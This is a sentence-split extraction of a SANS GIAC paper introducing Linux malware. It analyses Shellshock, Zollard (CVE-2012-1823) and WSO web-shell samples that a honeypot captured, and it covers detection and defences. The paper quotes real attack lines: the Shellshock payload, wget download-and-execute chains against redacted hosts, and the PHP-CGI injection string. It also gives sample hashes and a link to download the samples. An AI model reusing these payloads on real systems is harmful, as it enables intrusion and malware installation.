@@ -1,0 +1,260 @@
+Number,Content
+Sentence 1,"Global Information Assurance Certification Paper
+Copyright SANS Institute
+Author Retains Full Rights
+This paper is taken from the GIAC directory of certified professionals."
+Sentence 2,Reposting is not permited without express written permission.
+Sentence 3,Interested in learning more?
+Sentence 4,"Check out the list of upcoming events offering
+Security Essentials: Network, Endpoint, and Cloud (Security 401)
+at http://www.giac.org/registration/gsec
+
+An Introduction to Linux-based malware
+"
+Sentence 5,"
+GIAC (GSEC) Gold Certification
+Author:!Matt!Koch,!Matt@AltitudeInfosec.com
+Advisor:!Stephen!Northcutt
+Accepted:!6/23/2015
+"
+Sentence 6,"
+Abstract
+Although rarely making news headlines Linux malware is a growing problem."
+Sentence 7,"As a
+result, Linux systems are left in an insecure state with minimal defenses against malware."
+Sentence 8,"This becomes increasingly problematic with the growth of networkable embedded devices
+often referred to as the “Internet of Things” (IoT)."
+Sentence 9,"This paper will discuss attack vectors
+for Linux malware, analyze several pieces of malware and describe defensive capabilities."
+Sentence 10,"1.Introduction 
+
+General perception is that Linux operating systems are “Virus free” (Fedora Project, 2012) or that malware is “rare” (Ubuntu, 2015)."
+Sentence 11,"Linux, Unix and BSD variants comprise approximately 66% of the Internet web servers (W3 Techs, 2015)."
+Sentence 12,"With a majority share of systems serving websites and other internet traffic, creating malware targeting Linux servers and other devices offers a large, internet_accessible attack service for malware."
+Sentence 13,"A security and antivirus vendor reported seeing an average of 27,000 newly compromised websites per day  (Sophos, 2015)."
+Sentence 14,"Extrapolating the Linux and related Unix variants this could be as many as 17,000 websites compromised per day."
+Sentence 15,"The attack surface is also growing quickly: at current estimates nearly 5 billion networked devices are in operation (Gartner, 2014)."
+Sentence 16,"1.1.Definition of Malware 
+
+Malware is most often defined as “Code used to perform malicious actions” (SANS Technology Institute, 2015)."
+Sentence 17,"In order to infect a target, malware must also be able to exploit a vulnerability."
+Sentence 18,This may range from simply enticing a user to execute a file to automated exploitation of specific software vulnerabilities.
+Sentence 19,"In many cases malware will contain several functions: code to exploit a particular vulnerability, a payload, a propagation mechanism and command and control functions (Amine, Mohamed, & Benatallah, 2014)."
+Sentence 20,"2.Gathering Samples 
+
+Various samples were gathered from an Apache web server hosting the WordPress web application as well as default Apache static content."
+Sentence 21,The internet_facing web server was placed in a segmented Demilitarized Zone (DMZ) to protect internal systems and internal network segments from attack.
+Sentence 22,"Egress firewall rules were implemented to prevent command and control traffic from reaching its 
+None
+intended destination."
+Sentence 23,In order to prevent actual compromise of the web server and application the system was protected by a Apache web server running Modsecurity web application firewall (WAF) configured as a HTTP reverse proxy.
+Sentence 24,The OWASP Core Ruleset was applied to the system.
+Sentence 25,For network_based monitoring a Moloch full packet capture system was also place on the network to log inbound and outbound traffic from the web application server.
+Sentence 26,"Without full network packet capture, malware investigation is difficult if not impossible (Vacca, 2014)."
+Sentence 27,A Snort network intrusion detection system was also configured to monitor the system for attacks or successful exploitation of the system.
+Sentence 28,3.
+Sentence 29,"Malware Examples and Analysis 
+
+The following samples were gathered between 2014 and 2015."
+Sentence 30,A total of 49 unique specimens were gathered.
+Sentence 31,The entire sample set was de_duplicated by comparing MD5 hash sums.
+Sentence 32,"3 representative samples: “China.Z_qheh”, Zollard, and “WSO Web Shell” were analyzed."
+Sentence 33,The source and destination information has been redacted.
+Sentence 34,3.1.
+Sentence 35,"CVE-2014-6271: Known as “Shellshock” or “BASH Bug” Sample (sample from 67.174.125.223) 
+
+In 2014, a critical vulnerability was discovered in the GNU Project’s Bourne_Again Shell (BASH) and assigned CVE_2014_6271 (NIST, 2014)."
+Sentence 36,Automated scanning and exploitation began immediately after the advisory was made public.
+Sentence 37,"ShellShock exploitation attempts against an apache system are detected by monitoring for the characters “( ){“ in HTTP requests (Redhat Software, 2014)."
+Sentence 38,Figure 1 shows a recent exploitation attempt.
+Sentence 39,"None
+Figure'1:'Screen'capture'from'the'Jwall'Modsecurity'audit'logs.''"
+Sentence 40,"This particular attack shows an attempt to download a file named “java” using wget, a common commandline tool used for file downloads  (Free Software Foundation, 2015)."
+Sentence 41,The Wget command will retrieve a file named “java” from http://X.X.X.X:911.
+Sentence 42,The payload is then saved as “Run.sh” into the /tmp directory.
+Sentence 43,"The file is given read,write, and execute permission by the command “chmod 777”."
+Sentence 44,3.2.
+Sentence 45,"CVE-2012-1823: “Zollard” exploit example 
+
+Figure 2 shows the modsecurity audit log of an unusual web request."
+Sentence 46,The exploit contains a HTTP POST method with a request to the URL /cgi%bin/php?+Followed by a string of encoded characters.
+Sentence 47,Performing a URL decode with a tool such as the Burpsuite decoder will reveal a decoded string passed to /cgi_bin/php.
+Sentence 48,Additionally the User_Agent string contains an unusual word “Zollard”.
+Sentence 49,'''Figure'2:''Modsecurity'audit'log'of'a'zollard'exploitation'attempt.'
+Sentence 50,"None
+Figure'3:''Burp'Suite'decoder'output'using'URL'decode''/cgiEbin/php?Ed'allow_url_include=on'Ed'safe_mode=off'Ed'suhosin.simulation=on'Ed'disable_functions='Ed'open_basedir=none'Ed'auto_prepend_file=php://input'Ed'cgi.force_redirect=0'Ed'cgi.redirect_status_env=0'–n' 
+None
+An internet search for this string reveals that it is used to exploit a PHP vulnerability CVE_2012_1823 (Imperva, 2014)."
+Sentence 51,After the string is passed to the PHP interpreter a PHP payload script is passed in the HTTP request body as shown in Figure 4.
+Sentence 52,"Figure'4:'Modsecurity'audit'log'showing'PHP'script'run'after'exploitation''Of interest are the last several lines of this php script: myshellexec(rm'Erf'/tmp/armeabi;wget'EP'/tmp'http://X.X.X.X:58455/armeabi;chmod'+x'/tmp/armeabi);'myshellexec(rm'Erf'/tmp/arm;wget'EP'/tmp'http://X.X.X.X:58455/arm;chmod'+x'/tmp/arm);'myshellexec(rm'Erf'/tmp/ppc;wget'EP'/tmp'http://X.X.X.X:58455/ppc;chmod'+x'/tmp/ppc);'myshellexec(rm'Erf'/tmp/mips;wget'EP'/tmp'http://X.X.X.X:58455/mips;chmod'+x'/tmp/mips);'myshellexec(rm'Erf'/tmp/mipsel;wget'EP'/tmp'http://X.X.X.X:58455/mipsel;chmod'+x'/tmp/mipsel);'myshellexec(rm'Erf'/tmp/x86;wget'EP'/tmp'http://X.X.X.X:58455/x86;chmod'+x'/tmp/x86);'myshellexec(rm'Erf'/tmp/nodes;wget'EP'/tmp'http://X.X.X.X:58455/nodes;chmod'+x'/tmp/nodes);'myshellexec(rm'Erf'/tmp/sig;wget'EP'/tmp'http://X.X.X.X:58455/sig;chmod'+x'/tmp/sig);'myshellexec(/tmp/armeabi;/tmp/arm;/tmp/ppc;/tmp/mips;/tmp/mipsel;/tmp/x86;);'?>' 
+
+"
+Sentence 53,"
+Command Explanation
+
+rm _rf /tmp/armeabi Delete /tmp/armeabi if it already exists wget _P /tmp Download file at location 
+None
+http://X.X.X.X:58455/armeabi http://X.X.X.X:58455/armeabi chmod +x /tmp/armeabi Add execute file system permissions to the downloaded file."
+Sentence 54,"/tmp/armeabi;/tmp/arm;/tmp/ppc;/tmp/mips;/tmp/mipsel;/tmp/x86; Execute the files downloaded from http://X.X.X.X:58455  
+
+"
+Sentence 55,"
+As for the payload, there are multiple versions of the payload downloaded."
+Sentence 56,Each version is precompiled for different processor architectures including several processor architectures found in small embedded device systems such as ARM (Advanced Risc Machines) and MIPS (Microprocessor without Interlocked Pipeline Stages).
+Sentence 57,This unique behavior could result in widespread infection of IoT (Internet of Things) and other embedded or small computing devices.
+Sentence 58,3.3.
+Sentence 59,"WordPress “WP All Import” plug-in Remote Code Execution / Arbitrary file upload Vulnerability  
+
+WordPress is a popular Content Management System (CMS) and is also highly targeted by attackers (Imperva, 2014)."
+Sentence 60,"In addition to the core Wordpress software, additional features are available by using third party plugins and themes."
+Sentence 61,These wordpress components are common targets for attack and have a large attack surface.
+Sentence 62,"WPVulnDB.com, a popular website for tracking wordpress related vulnerabilities currently reports 1854 unique vulnerabilities in wordpress core, themes and plugins (Sucuri, 2015)."
+Sentence 63,"On February 26th, 2015 “WP All Import” published a patch and notified its customers to upgrade immediately (WP All Import, 2015)."
+Sentence 64,"Of interest, a vulnerable system could have arbitrary files uploaded to the file system."
+Sentence 65,"On March 2nd, 2015 a proof of concept exploit was published (Packet Storm Security, 2015)."
+Sentence 66,"On March 8th, 2015 the first exploitation attempt against WP All import was detected by the research system."
+Sentence 67,"In this example, a fully patched operating system and even a fully patched core WordPress can lead to malicious code execution on a system."
+Sentence 68,"None
+Figure'5'''Attempted'exploitation'of'the'“WP'All'Import”'plugEin,'including'upload'of'an'obfuscated'PHP'script'named'“cache.php”'
+
+4."
+Sentence 69,"Malware Payload Analysis 
+
+In most of the samples shown a payload was downloaded from a remote server to the victim machine."
+Sentence 70,Any of the remaining samples such as “cache.php” were uploaded as part of an HTTP POST method.
+Sentence 71,"Each sample was compared using a current signature and latest stable release from 3 popular antivirus applications: Clam Antivirus (CLAMAV), Sophos Antivirus for Linux and McAfee VirusScan Enterprise for Linux."
+Sentence 72,Detection rates ranged from 22% to 46%.
+Sentence 73,More information is available in Appendix A.
+Sentence 74,4.1.
+Sentence 75,"“BASH bug/Shell Shock” example payload 
+
+As shown in Figure 1, after exploitation a series of commands are issued to retrieve generate a small shell script called “Run.sh”, download the malware payload and run the payload."
+Sentence 76,Following BASH shell syntax commands are separated with a semi_colon.
+Sentence 77,"None
+Command+++Explanation+() { :; }; “Bash bug” exploit CVE_2014_6271 /bin/bash _c rm _rf /tmp/*; Delete contents of /tmp directory echo wget http://X.X.X.X:911/java _O /tmp/China.Z_qheh >> /tmp/Run.sh; Save the wget command to a shell script named “Run.sh” in the /tmp directory."
+Sentence 78,Save the file from http://X.X.X.X:911/java  as /tmp/China.Z_qheh echo echo By China.Z >> /tmp/Run.sh; Append “By China.Z” to the Run.sh script.
+Sentence 79,echo chmod 777 /tmp/China.
+Sentence 80,Z_qheh >> /tmp/Run.sh; Change the file system permissions on “China.
+Sentence 81,Z_qheh” to allow the file read/write/execute access.
+Sentence 82,echo /tmp/China.
+Sentence 83,Z_qheh >> /tmp/Run.sh;  Append a command to execute the file “/tmp/China.Z_qheh” echo rm _rf /tmp/Run.sh >> /tmp/Run.sh; Append a command to delete the /tmp/Run.sh shell script chmod 777 /tmp/Run.sh; Change the file system permissions on /tmp/Run.sh to allow the file read/write/execute access.
+Sentence 84,/tmp/Run.sh Run the Run.sh shell script  This leaves a few questions: What kind of file is “/tmp/China.Z_qheh”?
+Sentence 85,And more importantly what does “/tmp/China.Z_qheh” do?
+Sentence 86,Using the “file” command can provide the type of file format.
+Sentence 87,"$file/tmp/China.Z1qhehChina.ZEqheh:'ELF'32Ebit'LSB'executable,'Intel'80386,'version'1'(SYSV),'statically'linked,'for'GNU/Linux'2.2.5,'not'stripped'
+None
+From the output of the “file” command, /tmp/China.Z_qheh is an ELF (Executable and Linkable Format) executable format file."
+Sentence 88,"ELF is the standard format for Linux executables and therefore a popular format for most Linux based malicious code (Malin, Casey, & Aquilina, 2014)."
+Sentence 89,Using the command “strings” is a quick and easy way to perform basic analysis on a binary file.
+Sentence 90,"Searching for IP addresses, hostnames, specific keywords and file paths can provide some valuable information what a file may be doing."
+Sentence 91,"Some caution should be used when relying on this information: in some cases fake information can be added to a compiled program to throw off an investigator (Malin, Casey, & Aquilina, 2014) Using the file type information gathered, strings can be invoked with the encoding of the file and only providing entries with a certain length."
+Sentence 92,"In this example a minimum length of 8 characters and the elf32_i386 encoding is specified:   $strings1811target=elf321i386/tmp/China.Z1qhehXPRQSVWhs*'<_t1,0<''QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQj'<dtn<it`<otR<utD<xt6<Xu'<@tY<_tm1'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQj'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQj'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQj\'A substantial number of lines are returned: most appear to be unintelligible."
+Sentence 93,Using some keyword searches may provide some more intelligible information.
+Sentence 94,"For example, a case insensitive search for “attack” reveals several interesting strings."
+Sentence 95,"$strings1a/tmp/China.Z1qheh|grep1iattack11CAttackBase'13CPacketAttack'10CAttackUdp'10CAttackSyn'11CAttackIcmp'10CAttackDns'10CAttackAmp'
+None
+10CAttackPrx'15CAttackCompress'10CTcpAttack'9CAttackCc'10CAttackTns'9CAttackIe'Attack.cpp'Searching for IP addresses can also reveal interesting information: IP addresses contained in the file may indicate addresses of a command and control system or potential victim addresses."
+Sentence 96,The example command below is used to extract IP addressed from the binary and display a unique list for further analysis.
+Sentence 97,"$+strings+%%target=elf32%i386+/tmp/China.Z%qheh+|+grep+%w+'[0%9]\{1,3\}\.[0%9]\{1,3\}\.[0%9]\{1,3\}\."
+Sentence 98,"[0%9]\{1,3\}'+|+sort+|+uniq+–u+8.8.8.8 8.8.4.4 8.8.8.8 127.0.0.1 61.132.X.X 202.102.X.X 202.102.X.X 202.102.X.X (Truncated) 
+
+Although the strings information may be altered, the information gathered indicates this file may be used to conduct some type of DOS (Denial of Service) or other network_based attacks."
+Sentence 99,Further analysis is required to confirm this theory.
+Sentence 100,4.2.
+Sentence 101,"Zollard Payloads 
+
+To analyze the payloads downloaded from http://X.X.X.X:58455 using the “file” command to determine the type of file."
+Sentence 102,"Figure 6 confirms that the files appear 
+None
+to be pre_compiled ELF files for various process architectures include MIPS, ARM, and PowerPC."
+Sentence 103,"Figure'6:''File'command'output'of'the'Zollard'specimens:'compiled'for'various'processor'architectures' Similar to the BASH bug specimen, using the “strings” command may reveal some additional information about this file."
+Sentence 104,Using the “x86” payload as an example.
+Sentence 105,Using the command “strings'E9'EEtarget=elf32Ei386'x86”'reveals several strings of interest.
+Sentence 106,"Figure 7 shows the URL encoded string used to exploit CVE_2012_1823 as well as the HTTP headers used by Zollard including the User_agent string “Mozilla/5.0+(compatible;+Zollard;+Linux)”    Figure'7:''HTTP'POST'method'with'the'CVEE2012E1823'(Imperva,'2014)'and'HTTP'Headers'matching'the'exploit'attempt'in'Figure'2' Figure 8 also reveals something of interest: the “uname –m” command is used to determine if the system is 32 or 64 bit."
+Sentence 107,"After determining the type, a program called “pooler_cpuminer” is downloaded from sourceforge.net and extracted from the archive."
+Sentence 108,"CPUMiner is a software project used for mining Bitcoin or Litecoin digital currency (cpuminer, 2015)."
+Sentence 109,"As shown in Figure 9, the minerd application is invoked and connects to p2pool.org, a popular bitcoin mining pool service (Coin Cadence, 2015) ."
+Sentence 110,"None
+Figure'8:''Checking'the'kernel'version'and'downloading'the'appropriate'cpuminer'application'from'sourceforge.net'  Figure'9:''Invoking'minerd'with'a'username'and'password' Although some the printed characters extracted from the Zollard specimen using strings may be “planted” (Malin, Casey, & Aquilina, 2014) the CVE_2012_1823 exploit code corroborates the exploit attempt shown in Figure 2."
+Sentence 111,The digital currency mining program indicates that the malware author has financial motivation.
+Sentence 112,4.3.
+Sentence 113,"PHP Web Shell Payload 
+
+When the WordPress “WP All Import” plugin vulnerability was exploited, a file named cache.php was uploaded during the exploitation."
+Sentence 114,"Viewing the cache.php file shows signs of obfuscation, verified by the use of the “preg_replace” function and the seemingly garbled parameter passed in the function."
+Sentence 115,"Several methods are available to de_obfuscate the file, internet services such as www.unphp.net or can be performed locally using Evalhook PHP library method (Sorbier, 2010) 
+None
+Figure'10:'Unphp.netoutputofthede1obfuscatedversionofcache.php The de_obfuscated version shows several interesting pieces of information."
+Sentence 116,Cache.php is performing a comparison using the preg_match function of the HTTP header user_agent and returning a “404 Not Found” when visited by several popular web crawlers.
+Sentence 117,The altered response logic could indicate an attempt to conceal cache.php from being visited by web crawlers and therefore avoiding detection.
+Sentence 118,"An internet search using the “WSO_VERSION” string revealed a Google code repository and described the software as a “web shell” (unknown, 2015)."
+Sentence 119,Web shells are often used as a persistence method or as a backdoor by attackers after compromising a system.
+Sentence 120,Reviewing the source code revealed a similar code behavior to the cache.php file.
+Sentence 121,The Google code site also includes an “undetectable” version of the web shell available for download with similar obfuscation to the cache.php file collected.
+Sentence 122,"The web shell script can be used to perform a variety of activities, giving the attacker full control of the compromised system."
+Sentence 123,"Features include support for both Windows and Linux_based systems, interactive shell, file browser and brute 
+None
+force features (Figure 11) and Reverse Shell capabilities (Figure 12)."
+Sentence 124,"Figure'11:'Brute'force'options'for'“WSO'Web'shell”'' Figure'12:'Reverse'Shell'code'calling'a'Perl'script'in'/tmp/bc.pl' 
+"
+Sentence 125,"
+
+4.4."
+Sentence 126,"Common characteristics among the sample payloads 
+
+Many of the malware specimens gathered including all 3 samples analyzed relied on downloading malicious executables to or executing code from the /tmp directory."
+Sentence 127,"This particular malware technique can be mitigated by mounting the /tmp partition with the “noexec” option (Negus, 2012)."
+Sentence 128,Mounting a partition with the “noexec” options will prevent executable files from running in the /tmp directory.
+Sentence 129,"Additionally both the BASH bug speciment and Zollard speciment retrieved files from non_standard HTTP ports (see Figure 1, 4 and 9)."
+Sentence 130,"An egress firewall policy may not have prevented exploitation but would have prevented the download of 
+None
+payload executables in both examples of TCP ports 911 and 58455."
+Sentence 131,Traffic on a Non_standard HTTP port can also be detected by most instruction detection systems.
+Sentence 132,"Snort for example offers the “detect_anomalous_servers” option in the Snort HTTP Preprocessor (Roelker, 2015)."
+Sentence 133,"However this feature is disabled by default (The Snort Team, 2015)."
+Sentence 134,Host_based antivirus software detection was marginal: ranging from 22% to 46% detection rate of the sample set.
+Sentence 135,Although antivirus software assisted in identifying and categorizing some of the malware samples it was unable to detect a majority of the samples gathered.
+Sentence 136,All three specimens analyzed and the entire sample set were detected using the ModSecurity web application firewall.
+Sentence 137,"Without monitoring of the web application layer, detecting and logging complete malware exploitation attempts would not be possible."
+Sentence 138,Modsecurity provided complete audit logging of the HTTP request and HTTP response including the parameters.
+Sentence 139,"This level of logging is not possible with a native Apache webserver for a production system (Ford, 2008)."
+Sentence 140,"5.Conclusions 
+
+Despite popular perception, Linux can be vulnerable to a variety of malware."
+Sentence 141,Existing host_based defense such as antivirus software is marginal at detecting or preventing Linux malware threats.
+Sentence 142,Based on organizational risk tolerance additional security controls may be required to prevent or identify Linux malware infections.
+Sentence 143,Utilizing a combination of system hardening techniques and network based controls can provide an additional layer of security.
+Sentence 144,Incident response capabilities may also require adjustment to detect and respond to the growing threat of Linux malware.
+Sentence 145,
+Sentence 146,"
+7.Appendix A: Additional Payload information 
+
+7.1.“ShellShock” 
+
+Payload filename: “java” MD5 Hashsum: 15293d54a15e7ffe3e23c5c15d895cd7 SHA1+HashSum: 42aac86ae8627b1c9e6f681672519b73c580d132 SHA256+Hashsum: 098a02314cbf266566705b37b0ccc74eca66670f7ea75518bfc23d6843bbb478 Antivirus results:  CLAMAV: Linux.Trojan.Agent # freshclam __version ClamAV 0.98.4/20330/Wed Apr 15 13:19:08 2015 
+
+"
+Sentence 147,"
+7.2.Zollard sample 
+Received March 11th, 2015 9:52:52 Mountain Time."
+Sentence 148,"Payload hashes:  MD5+Hashsums:+Arm: 34430c246b8740ffa208b38a0077160d  Armeabi: 8f8ddea8754181980823270da778c36b  Mips: bc7230fefef2f6ac7d7da2f33c5dfe82   Mipsel: 51e5648bee24384d46439887702b103b  Ppc: 01ad371d727a5aede23a6afd803f5abe  Sig: 7507888ab086e75af849f0970e963788  X86: 0e60bac86972e2cfc328332ce37a59af  Nodes: (Payload could not be downloaded)  SHA1+Hashsums Arm: 1713331dca6d9b798a032abae10fa2cfd54e48d3  Armeabi: 3f693ac6961db906fdb732442c90db6782921574  
+None
+Mips: 635f90418458dce5408c4a875b51de355cfe541f  Mipsel: a5530c5dcc91e7bf6b535ce45cc39000c92e14ae Ppc: c1984b7056bd9c828d096d7e02477b3a480963d6  Sig: af95eacc89954bb94a645de0f7f1714b7e5e3a0e  X86: b4aff97660a9cb6c3710f5e95703d2c04cc2bac7     Figure'13''CLAMAV with fully up to date signature set is unable to detect the Zollard specimens  All undetected specimens have been submitted as false negatives to the CLAMAV Project."
+Sentence 149,
+Sentence 150,"
+7.3.PHP Web Shell  
+Cache.php was uploaded to WordPress Honeypot on March 11th, 2015 at 7:12:20 AM Mountain time."
+Sentence 151,"Deobfuscated using www.unphp.net Recent version of WSO is available at https://code.google.com/p/wso_web_shell_2_8/   
+
+"
+Sentence 152,"
+7.4.Malware Detection Rates  
+CLAMAV SOPHOS McAfee Samples Detected: 16 23 11 Percentage Detected: 32.65% 46.94% 22.45%  File MD5 Hash Sum File Name CLAM SOPHOS McAfee 9f5049a1f72b215d122d8c13c77301c8 24 1 1  6dbfc80bf15d53f368de024ce88df625 32 1 1  a1137767e888fd9ab8b8997ad6c9869c 60 1 1  3f5a5a33f4fcca7315f30b843eb9cf0f 64 1 1  a868ffa2d3fa27e83d96326efd9b3c55 200    df74b22da652138530d1a5ee4e658dc1 72464 1 1 1 1ee789f4d226bd1c37c47d7f264eb506 .nynew57.tar.gz  1  593e887daed8cdbb22e04e6c22b75855 .p 1  1 a2f420feae93d2180371ac050b524c5a 900.htm 1 1 1 34430c246b8740ffa208b38a0077160d arm  1  8f8ddea8754181980823270da778c36b armeabi  1  9b326fac414287d29156eb6060a0f4e0 cache.php 1 1  e94240600a3cb44e14d36f37debf0ff5 cata.txt    7ae21f4543fe5f842a7bb9f79d95a88e den 1 1  ce68f4076df62a1ecd10b1ee36bdac11 htrdps    98d1aab6b0e9b5e025437d0de3541ef3 i.gif    e6fd384bd9a7778364882c1a01ad2164 i2.gif    4ffd55ea9cd52950762804d8cc15a48f index.html    505acc040e76f83373f0f64b7f887ba1 index2.html    77d384ae88d205f112c48936b3f1639f inf.sh    15293d54a15e7ffe3e23c5c15d895cd7 java 1 1  e31c1cc471935fee273df0e2811bbe47 kthread    4582febf8b6533329939f7a1b35d87ce m.txt    bc7230fefef2f6ac7d7da2f33c5dfe82 mips  1  51e5648bee24384d46439887702b103b mipsel  1 1 bf6d34cc16eed1de59b94a02da9784d0 muh.zip    871eb62f62dbda3f0ba89e77af308892 mydg32.tar.gz    d41d8cd98f00b204e9800998ecf8427e news    e7d1e67d9cda78833534218062c338e5 nynew54.gif  1 1 9c415bbe3fcd2be3fa4712d759e8023d ou.pl 1 1 1 e278bf1069934064fa69ac5efa495316 p.py    01ad371d727a5aede23a6afd803f5abe ppc  1  
+None
+1833c07c61440cfc1cfaa074c69d757d pr.gif    5ef666696edb86953c516da80d9e95d2 psrs    00886e49d08a9bc3c3ae2fb24437d622 r2.php 1   4bc0e3c209e0686e8cc1ad46b0df6300 rio.zip 1 1 1 1ee789f4d226bd1c37c47d7f264eb506 sample.tar.gz  1 1 c15d21180b7cf946a306d2fb09efd518 sc.gif    8a1210e2f4ddf015d34d583b163b7ce8 sh    22d736bf26234260b446ce97adb54570 shms    7507888ab086e75af849f0970e963788 sig    34ec9995dd96bec233e49914524a3a0c syn    ad330959e7394ad6a4065df402832c4d test.pl 1  1 7e48b46e2a0c31216464842f731dc8e9 TSm 1 1 1 70e6882fbc41586587621f05bae8ae66 tt.tgz    c2e4f63cdae81a798bbd2780176dac32 udpa  1  0a235ab6be81c376ac5be288cd95a6a6 windosy  1  621023ab22a79f1d29c888736dd3f875 x.zip 1 1 1 0e60bac86972e2cfc328332ce37a59af x86     
+
+"
+Sentence 153,"
+7.5."
+Sentence 154,"Download Malware samples 
+All malware samples are available for download at http://altitudeinfosec.com/presentations"
